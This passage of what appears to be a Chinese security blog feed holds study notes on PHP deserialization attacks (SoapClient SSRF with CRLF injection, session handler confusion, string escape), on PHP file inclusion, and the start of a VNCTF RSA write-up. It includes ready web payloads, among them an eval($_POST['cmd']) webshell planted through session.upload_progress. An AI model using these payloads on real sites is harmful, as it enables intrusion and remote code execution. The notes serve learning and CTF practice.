DATA</code></p><p>如果要在自己的环境复现则需要更改<code>php.ini</code>中的<code>extension=soap</code></p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>举个栗子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;kirito-zbds&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">NULL</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;k1rit0&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line">    <span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> -&gt; tan90_function();</span><br></pre></td></tr></table></figure><p>当<code>SoapClient</code>对象被逆序列化出来并调用一个不存在的<code>tan90_function()</code>方法时.<code>__call()</code>方法会向<code>location</code>也就是<code>http://127.0.0.1/test.php</code>发送一个<code>HTTP POST</code>请求, 而请求头中会有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: kirito-zbds</span><br><span class="line">SOAPAction: k1rit0#tan90_function()    &#x2F;&#x2F; uri + 被调用的不存在的函数名</span><br></pre></td></tr></table></figure><p>可以看到, 请求头中的这些字段会变成可控的, 但这样只能通过内网访问<code>test.php</code>, 并不能任意<code>POST</code>数据. 要想<code>POST</code>数据, 就要用到<code>CRLF</code>了.</p><h4 id="什么是CRLF"><a href="#什么是CRLF" class="headerlink" title="什么是CRLF"></a>什么是CRLF</h4><p><code>CRLF</code>就是<code>\r\n</code>的缩写, <code>HTTP</code>协议中<code>header</code>之间是用一个<code>\r\n</code>来分隔的, 而<code>HTTP header</code>和<code>HTTP body</code>之间是用<code>\r\n\r\n</code>也就是两个<code>\r\n</code>来分割的. 如果请求头中的字段可控, 那么可以手动添加<code>\r\n</code>用以在请求中添加字段甚至是添加<code>HTTP body</code>用以<code>POST data</code>. </p><p>比如在上面的例子中, 我们把<code>$ua</code>改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;kirito-zbds\r\nContent-Type:application-www-form-urlencoded\r\nContent-Length:17\r\n\r\ndata=this_is_data&quot;</span></span><br></pre></td></tr></table></figure><p>那么<code>HTTP POST</code>的请求头中就会出现这么一串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: kirito-zbds</span><br><span class="line">Content-Type: application-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">data&#x3D;this_is_data</span><br><span class="line">SOAPAction: k1rit0#tan90_function()</span><br></pre></td></tr></table></figure><p>这样就成功伪造出<code>HTTP POST</code>请求并传输参数了</p><h1 id="php-session反序列化"><a href="#php-session反序列化" class="headerlink" title="php-session反序列化"></a>php-session反序列化</h1><p>又是<code>session</code>, 上次在文件包含也有<code>session</code>, 其实这里的反序列化也要用到那边的知识</p><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><h3 id="关于session-upload-progress"><a href="#关于session-upload-progress" class="headerlink" title="关于session.upload_progress"></a>关于<code>session.upload_progress</code></h3><p>这个<code>php-session</code>反序列化其实跟<code>session.uplaod_progress</code>有关, 详细的可以看文件包含那部分的笔记<br>这里只简单的说一下, 服务端的<code>php.ini</code>默认配置<code>session.use_strict_mode = 0</code>, 这样用户可以自己设置<br><code>Cookies: PHPSESSID = xxxxxx</code>, 服务端将会创建一个<code>/tmp/sess_xxxxxx</code>文件</p><p>并且, 如果用户向服务端传送文件, 那么服务端将会在<code>/tmp/sess_xxxxxx</code>中写入上传进度, 最重要的是. 如果用户的<br><code>POST DATA</code>中含有<code>PHP_SESSION_UPLOAD_PROGRESS=xxx</code>, 那么服务端将会在<code>/tmp/sess_xxxxxx</code>中写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_xxx | 上传进度</span><br></pre></td></tr></table></figure><h3 id="关于session-serialize-handler"><a href="#关于session-serialize-handler" class="headerlink" title="关于session.serialize_handler"></a>关于<code>session.serialize_handler</code></h3><p>在执行<code>php</code>代码时可以设置这么两个东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里设置的是php处理<code>session</code>的方式,<code>php</code>或<code>php_serialize</code>. 默认是<code>php</code><br>这两个方式的不同就在于, 存取<code>session</code>文件的格式不同.<br>下面从一个例子来详细的看一下这两个方式的区别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">// ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k1rit0&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure><p><code>php</code>方式的存取的格式是:<code>键名|serialize_string</code>, 当我传<code>?a=a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;</code><br><code>session</code>文件中存的是<code>k1rit0|s:45:&quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;</code></p><p>而如果用的是<code>php_serialize</code>方式,存取的格式就是<code>serialize_string</code>, <code>session</code>文件中存的便是<br><code>a:1:&#123;s:6:&quot;k1rit0&quot;;s:45:&quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125;</code></p><h2 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h2><p>根据上面的两个<code>session</code>存取方法, 如果我们先以<code>php_serialize</code>储存 再按<code>php</code>的方式读取, 就可以反序列化一些恶意的序列. 就拿上面的例子来说, 先以<code>php_serialize</code>储存<code>?a=|a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;</code>,注意那个<code>|</code></p><p>这个时候来看看<code>session</code>里是啥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:6:&quot;k1rit0&quot;;s:46:&quot;|a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>如果这个时候, 按<code>php</code>的方式读取这个<code>session</code>文件, 就会被识别成两部分:</p><ol><li><code>|</code>前面的<code>a:1:&#123;s:6:&quot;k1rit0&quot;;s:46:&quot;</code></li><li><code>|</code>后面的<code>a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125;</code></li></ol><p> <code>|</code>后面的前一部分``a:2:{s:4:”name”;s:6:”kirito”;s:3:”age”;i:14;}`, 会被识别成一个完整的序列化串</p><blockquote><p>这里有个session_start()的小知识, 如果php代码中存在session_start()而且处理session的方式是php, 那么在执行<br>session_start()时会反序列化session中<code>|</code>后的序列化串, 并赋值给$_SESSION变量</p></blockquote><p>如果<code>php</code>代码中某些类中有<code>__wake()</code>或<code>__destruct()</code>, 并且这两个魔法函数中存在危险的函数, 则可以通过<code>session</code>反序列化控制这些危险函数.</p><p>至于如何在<code>session</code>文件中写入恶意序列化串呢? 那就要用到<code>session.upload_progress</code>中的<br><code>PHP_SESSION_UPLOAD_PROGRESS</code>了, 具体怎么用, 去看文件包含那篇笔记吧</p><h1 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h1><p>如果存在对序列化后的字符进行替换, 并且替换后字符长度会变, 则有可能存在字符逃逸</p><h2 id="替换后字符变长"><a href="#替换后字符变长" class="headerlink" title="替换后字符变长"></a>替换后字符变长</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">&quot;o&quot;</span>, <span class="string">&quot;oo&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如说上面这个函数, 把输入的字符串中的<code>o</code>替换成<code>oo</code><br>如果有这么个数组<code>array(&quot;name&quot; =&gt; &quot;kirito&quot;,&quot;level&quot; =&gt; &quot;18&quot;);</code>,<br>序列化之后就是<code>a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code><br>再用上面的函数处理序列化字符串, 就会变成<code>a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kiritoo&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code>, 这里就会出现一个错误<code>s:6:&quot;kiritoo&quot;</code>, 长度应该为6的字符变成7了</p><p>逃逸逃逸, 目的就是逃出双引号, 如果我们的数组是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;name&quot;</span> =&gt; <span class="string">&#x27;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;level&quot;</span> =&gt; <span class="string">&#x27;18&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>序列化之后就是<br><code>a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code></p><p>这里<code>name</code>里面本身就有双引号, 但是不能实现逃逸, 是因为反序列化时候, 会读取指定长度的字符后下一个字符是否是<code>&quot;</code><br>就比如这里的<code>s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;</code>,<br>读取55个字符<code>kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>后, 就剩下结尾的<code>&quot;</code>, 所以中间的<code>&quot;</code>并不影响反序列化</p><p>但如果将序列化之后的字符串进行替换操作, 将会变成<br><code>s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>, 现在再来看看读取55个字符后是啥, 我们发现<code>kiritoooooooooooooooooooooooooooooooooooooooooooooooooo</code>刚好就是55个字符, 而后面刚好就是一个<code>&quot;</code>, 这意味着在反序列化的时候, 后面的<code>;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>则会逃逸出去, 被识别成序列化字符串的另一部分.(具体原因就是因为多出的<code>o</code>的长度刚好就是<code>&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>)的长度</p><p>最后, 我们来看看总的字符串处理完是怎样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><p>反序列化有个特点, 当判断反序列化结束后, 后面的字符将会自动忽略, 那么这里反序列化就会只处理<br><code>a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code><br>后面的<code>&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code>会被自动忽略, 这样我们就成功通过控制<code>name</code>, 逃逸并修改了<code>level</code></p><p>将处理后的字符串反序列化的结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123; </span><br><span class="line">[&quot;name&quot;]&#x3D;&gt; string(55) &quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot; [&quot;level&quot;]&#x3D;&gt; string(3) &quot;999&quot; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><blockquote><p>y4爷爷的反序列化总结: <a href="https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161638163316780357284910%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161638163316780357284910&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-14-113588692.pc_v1_rank_blog_v1&amp;utm_term=show">https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161638163316780357284910%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161638163316780357284910&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-14-113588692.pc_v1_rank_blog_v1&amp;utm_term=show</a></p><p>CRLF总结: <a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;当&lt;code&gt;unserialize()&lt;/code&gt;的参数可控时, 可以传入一个构造好的序列串控制类内部的变量甚至函数, 如果类内部存在比</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="Unserialize" scheme="http://tearsjin.github.io/tags/Unserialize/"/>
    
  </entry>
  
  <entry>
    <title>The learning of php 文件包含</title>
    <link href="http://tearsjin.github.io/2021/03/21/The-learning-of-php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://tearsjin.github.io/2021/03/21/The-learning-of-php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-03-21T06:26:07.000Z</published>
    <updated>2021-03-23T06:27:17.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>文件包含顾名思义, 通过某些函数来引入一些文件但传入的文件名没有经过合理的验证, 从而操作了预想之外的文件, 就可能导致意外的文件泄漏甚至恶意代码注入。</p><h2 id="常见的文件包含函数"><a href="#常见的文件包含函数" class="headerlink" title="常见的文件包含函数"></a>常见的文件包含函数</h2><ol><li><p><code>include()</code></p></li><li><p><code>require()</code></p></li><li><p><code>include_once()</code></p></li><li><p><code>require_once()</code></p></li><li><p><code>highlight_file()</code></p></li><li><p><code>show_source()</code></p></li><li><p><code>readfile()</code></p></li><li><p><code>file_get_contents()</code></p></li><li><p><code>fopen()</code></p></li><li><p><code>file()</code></p></li></ol><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>通常情况下有文件包含函数还不够, 需要搭配伪协议才能干更多的事情</p><table><thead><tr><th align="center">协议</th><th align="center">PHP版本</th><th align="center">alow_url_fopen</th><th align="center">allow_url_include</th><th align="left">用法示例</th></tr></thead><tbody><tr><td align="center">file://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">file://D:/soft/phpStudy/WWW/flag.txt</td></tr><tr><td align="center">php://filter</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td align="center">php://input</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center"><strong>on</strong></td><td align="left">php://input  [post data]: <code>&lt;?php phpinfo() ?&gt;</code></td></tr><tr><td align="center">zip://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">zip://D:/soft/phpStudy/WWW/file.zip%23flag.txt</td></tr><tr><td align="center">compress.bzip2://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">compress.bzip2://D:/soft/phpStudy/WWW/file.bz2<br />compress.bzip2://./file.bz2</td></tr><tr><td align="center">compress.zlib://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">同上</td></tr><tr><td align="center">data://</td><td align="center">&gt;=5.2</td><td align="center"><strong>on</strong></td><td align="center"><strong>on</strong></td><td align="left">data://text/plain,<code>&lt;?php phpinfo()?&gt;</code><br />data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td></tr></tbody></table><h2 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h2><p>Web服务器一般会将用户的访问记录保存在日志文件当中. 如果存在文件包含的函数, 而且知道日志文件的路径, 可以构造请求把PHP代码写进日志文件中并引入执行</p><h3 id="寻找日志文件"><a href="#寻找日志文件" class="headerlink" title="寻找日志文件"></a>寻找日志文件</h3><p>日志文件的目录一般会被修改, 可以寻找<code>httpd.conf,nginx,conf</code>或者根据<code>phpinfo()</code>中的信息来得知日志文件目录</p><p>Apache:</p><ol><li><p>Windows: <code>&lt;Apache安装目录&gt;\logs\access.log | error.log</code></p></li><li><p>Linux: <code>/usr/local/apache/logs/access_log | error_log </code></p></li></ol><p>Nginx:</p><ol><li><code>/var/log/nginx</code></li></ol><h2 id="包含session-upload-progress"><a href="#包含session-upload-progress" class="headerlink" title="包含session.upload_progress"></a>包含<code>session.upload_progress</code></h2><blockquote><p>PHP版本: 5.4+</p></blockquote><p>在php5.4以上添加了一个新的功能 <code>session.upload_progress</code>, 这个功能在客户端上传文件的时候会创建一个<code>session</code>文件, 默认路径应该是<code>/tmp/tmp</code>, 这个文件里存储的上传文件的进度. </p><p>不过, 要利用这个<code>session.upload_progress</code>, 还要依靠另外一个<code>php.ini</code>的默认选项<code>session.use_strict_mode = 0</code>, 当这个值为0的时候, 用户是可以自己定义<code>Session ID</code>的, 比如在<code>Cookies</code>中设置<code>PHPSESSID = k1rit0</code>, <code>php</code>将在服务器上创建一个<code>tmp/tmp/sess_k1rit0</code>, 并且自动初始化, 也就是会在里面写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.prefix + session.upload_progress.name</span><br></pre></td></tr></table></figure><p><code>session.upload_progress.prefix</code>是服务端设置的, 默认为<code>upload_progress_</code><br><code>session.upload_progress.name</code>是用户<code>POST</code>的<code>data</code>: <code>PHP_SESSION_UPLOAD_PROGRESS</code>, 比如<code>POST</code> <code>PHP_SESSION_UPLOAD_PROGRESS= &lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</code><br>那么用户在上传文件的时候, 就会生成这么一个<code>session</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span> | <span class="comment">// 后面是上传进度</span></span><br></pre></td></tr></table></figure><p>很显然这个文件如果被文件包含函数包含, 则可以执行一系列的命令<br><strong>但是这个<code>session</code>文件将在文件上传完成之后自动删除.<strong>这里就需要利用</strong>条件竞争</strong>了, 不停的上传同样的文件, 使得<code>session</code>一直存在.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="文件包含" scheme="http://tearsjin.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021VNCTF Crypto</title>
    <link href="http://tearsjin.github.io/2021/03/14/writeup-for-2021VNCTF/"/>
    <id>http://tearsjin.github.io/2021/03/14/writeup-for-2021VNCTF/</id>
    <published>2021-03-14T11:51:27.000Z</published>
    <updated>2021-03-24T08:03:01.256Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛听说是签到难度, 就做了一下, 结果也没能ak (说简单都是骗人的…)<br>嗯… 会做的题也没什么收获, 硬要说的话, whitegive的第一层需要通过运算把已知的条件合在一起或者消去一些不可能求出的参数, 这个一直都是密码分析的基础吧, 来看看题吧</p><h1 id="0x00-wihtegive"><a href="#0x00-wihtegive" class="headerlink" title="0x00 wihtegive"></a>0x00 wihtegive</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(url)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">m = e</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,lcm(p,lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)))</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint = <span class="built_in">pow</span>(d,e,n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c)</span><br><span class="line">print(hint)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span></span><br><span class="line"><span class="string">86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261</span></span><br><span class="line"><span class="string">1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959</span></span><br><span class="line"><span class="string">952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747</span></span><br><span class="line"><span class="string">788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Wow, you got here!</span></span><br><span class="line"><span class="comment"># This is the last task, trust me!</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,padding</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">7</span> </span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+padding,e,n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511</span></span><br><span 